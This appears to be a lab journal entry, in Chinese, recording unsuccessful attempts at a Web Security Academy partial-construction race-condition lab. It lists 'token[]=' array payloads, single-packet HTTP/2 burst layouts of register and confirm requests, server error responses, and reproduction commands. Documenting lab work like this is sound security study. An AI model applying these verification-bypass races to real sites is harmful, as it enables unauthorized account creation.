---
title: "lab-race-conditions-partial-construction  [stuck]"
links:
  - target: race-conditions-family
    relation: evidences
---

# lab-race-conditions-partial-construction  [stuck]

> evidences: [[race-conditions-family]]

- 题面:Partial construction race;绕邮箱验证建号 → 登录 → 删 carlos。
- 实例(批42R):https://0a6000ca034576b38078303c00c600e8.web-security-academy.net(exploit server 邮箱 `exploit-0a0e005b03f176ad80692fac01d300ce`)
- 状态:**unresolved**。本批把成文载荷(`token[]=` + 单包齐发)在真单包下跑穿,仍零命中,并把 bind 语义钉死。

## 实测机制与否证面

1. **单发语义(新增,精确文案)**:`POST /confirm?token[]=` 与 `POST /confirm?token[]` 都回
   `400 "Incorrect token: Array"`(JSON,24B)= app 把参数数组当**一个** bind 值铺开;
   `POST /confirm?token[][]=&token[]=` → 500(占位符 1 vs 参数 2)复核成立;
   `?token=hello` → `"Incorrect token: hello"`;`?token=` → 403 Forbidden。⇒ 半构造值必须等于 `''` 才能被 `WHERE token = ?` 命中。
2. **真单包也打不中**:h2_burst `single_packet_likely: true`(burst_bytes 1190-1341,8-10 流)下,四种排布全 miss:
   - `2×/register + 6×/confirm?token[]=`(同 session,jar 注 cookie);
   - `2×/register(带 Cookie 头) + 8×/confirm?token[]=`(确认腿**不带**任何 cookie,排除 PHP session 锁串行化);
   - `4×(register,4×confirm)` 交错(每 register 用**新用户名**,保证有 INSERT 窗口);
   - 大包 `10×register + 50×confirm`(burst_bytes 9277,流序 register 全在前)。
   累计 ~70 个确认请求,零次非 `Incorrect token`。
3. **同 session 并发确实存在**:同包 10 个同名 `/register` 中前 5 个成功(2636B),后 5 个拿
   3142B(重复用户名页)⇒ 竞态窗口对 *register* 可见(前 5 个都过了存在性检查),但对 **confirm 的 SELECT 不可见**。
4. 因此未决面收窄为:**INSERT 是否在显式事务里未提交**(则半构造行对其它连接不可见),
   或 **token 列默认不是 `''` 而是 NULL**(则 `= ?` 永不命中)。两条都与"用 `token[]=` 半构造值穿窗口"的成文说法冲突。

## 未决面(下一手候选)

- 用 `INSERT` 后立刻读的**同连接**原语验证事务可见性(需要能观测 pending 行的端点,目前没有)。
- 找能**回显/落日志** token 的端点(把半构造值读出来),或找 `token[]=[]`(空数组)形态:
  自研 query 解析器下 `token[]=` 得 `[""]`,空数组不可达 —— 若半构造态是 NULL 则该腿封死。
- 成文写本的"20-40 regs × 50-60 confirms 反复"在本 infra 需真正的多轮循环件(single_packet 预算 ≈1400B 时一轮放不下),
  本轮未投入新件;下批若续攻应先把"多轮单包 burst 循环"落成件。

## 复现

```
raw_http "<inst>/" --request-line 'POST /confirm?token[]= HTTP/1.1' --header 'Content-Length: 0'   # 400 "Incorrect token: Array"
raw_http "<inst>/" --request-line 'POST /confirm?token[][]=&token[]= HTTP/1.1' --header 'Content-Length: 0'  # 500 占位符泄漏
h2_burst "<inst>/" --req 'POST /register|csrf=..&username=rc20&email=rc20@ginandjuice.shop&password=..|Content-Type: application/x-www-form-urlencoded;;Cookie: phpsessionid=..' --req 'POST /confirm?token[]=' ×N --read-ms 4000
```
